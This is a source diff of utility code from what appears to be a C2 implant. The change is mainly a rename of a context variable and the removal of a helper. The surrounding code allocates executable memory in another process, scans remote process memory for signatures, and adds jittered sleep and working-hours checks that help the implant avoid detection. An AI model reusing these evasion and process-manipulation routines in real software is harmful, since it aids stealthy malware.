@@ -67,16 +67,6 @@ namespace Utils {
             return false;
         }
 
-        BOOL SymbolScan(const char* string, const char symbol, size_t length) {
-
-            for (auto i = 0; i < length - 1; i++) {
-                if (string[i] == symbol) {
-                    return true;
-                }
-            }
-
-            return false;
-        }
 
         UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {
             HEXANE;
@@ -85,7 +75,7 @@ namespace Utils {
             const auto address  = (uintptr_t) target;
 
             for (ret = (address & ADDRESS_MAX) - VM_MAX; ret < address + VM_MAX; ret += 0x10000) {
-                if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(process, (void **) &ret, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
+                if (!NT_SUCCESS(ctx->nt.NtAllocateVirtualMemory(process, (void **) &ret, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
                     ret = 0;
                 }
             }
@@ -110,7 +100,7 @@ namespace Utils {
             uintptr_t address   = 0;
 
             auto buffer = (uint8_t*) Malloc(size);
-            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, (void*) start, buffer, size, &read));
+            x_ntassert(ctx->nt.NtReadVirtualMemory(process, (void*) start, buffer, size, &read));
 
             for (auto i = 0; i < size; i++) {
                 if (SigCompare(buffer + i, signature, mask)) {
@@ -136,7 +126,7 @@ namespace Utils {
             FILETIME file_time       = { };
             LARGE_INTEGER large_int  = { };
 
-            Ctx->win32.GetSystemTimeAsFileTime(&file_time);
+            ctx->win32.GetSystemTimeAsFileTime(&file_time);
 
             large_int.LowPart    = file_time.dwLowDateTime;
             large_int.HighPart   = (long) file_time.dwHighDateTime;
@@ -149,7 +139,7 @@ namespace Utils {
 
             SYSTEMTIME systime = { };
 
-            uint32_t work_hours = Ctx->config.hours; 		
+            uint32_t work_hours = ctx->config.hours;
             uint16_t start_time = (work_hours >> 16); 		
             uint16_t end_time  	= (work_hours & 0xFFFF); 
 
@@ -161,7 +151,7 @@ namespace Utils {
     		uint16_t end_hour  	= end_time / 100;
     		uint16_t end_min   	= end_time % 100;
 
-    		Ctx->win32.GetLocalTime(&systime);
+    		ctx->win32.GetLocalTime(&systime);
 
     		// Check if the current time is outside the working hours
     		if ((systime.wHour < start_hour || systime.wHour > end_hour) ||
@@ -180,7 +170,7 @@ namespace Utils {
             HEXANE;
 
             auto defaultseed    = Utils::Random::RandomSeed();
-            auto seed           = Ctx->nt.RtlRandomEx((ULONG*) &defaultseed);
+            auto seed           = ctx->nt.RtlRandomEx((ULONG*) &defaultseed);
 
             volatile size_t x   = INTERVAL(seed);
             const uintptr_t end = Utils::Random::Timestamp() + (x * ms);
@@ -199,9 +189,9 @@ namespace Utils {
 
 			SYSTEMTIME sys_time = { };
 
-			uint32_t work_hours = Ctx->config.hours;      			
-			uint32_t sleeptime  = Ctx->config.sleeptime * 1000;  	
-			uint32_t variation  = (Ctx->config.jitter * sleeptime) / 100;  
+			uint32_t work_hours = ctx->config.hours;
+			uint32_t sleeptime  = ctx->config.sleeptime * 1000;
+			uint32_t variation  = (ctx->config.jitter * sleeptime) / 100;
 			uint32_t random     = 0;
 
 			uint16_t start_time = (work_hours >> 16);  		
@@ -212,7 +202,7 @@ namespace Utils {
 			uint16_t end_hour   = end_time / 100;
 			uint16_t end_min    = end_time % 100;
 
-			Ctx->win32.GetLocalTime(&sys_time);
+			ctx->win32.GetLocalTime(&sys_time);
 
 			if (!Time::InWorkingHours()) {  
 				if (sleeptime) {
@@ -272,8 +262,8 @@ namespace Utils {
 
             auto seed = RandomSeed();
 
-            seed = Ctx->nt.RtlRandomEx((PULONG) &seed);
-            seed = Ctx->nt.RtlRandomEx((PULONG) &seed);
+            seed = ctx->nt.RtlRandomEx((PULONG) &seed);
+            seed = ctx->nt.RtlRandomEx((PULONG) &seed);
             seed = seed % (LONG_MAX - 2 + 1) + 2;
 
             return seed % 2 == 0
@@ -287,7 +277,7 @@ namespace Utils {
             auto seed = RandomSeed();
 
             seed = RandomSeed();
-            seed = Ctx->nt.RtlRandomEx((PULONG) &seed);
+            seed = ctx->nt.RtlRandomEx((PULONG) &seed);
 
             return seed % 2 == 0 ? TRUE : FALSE;
         }
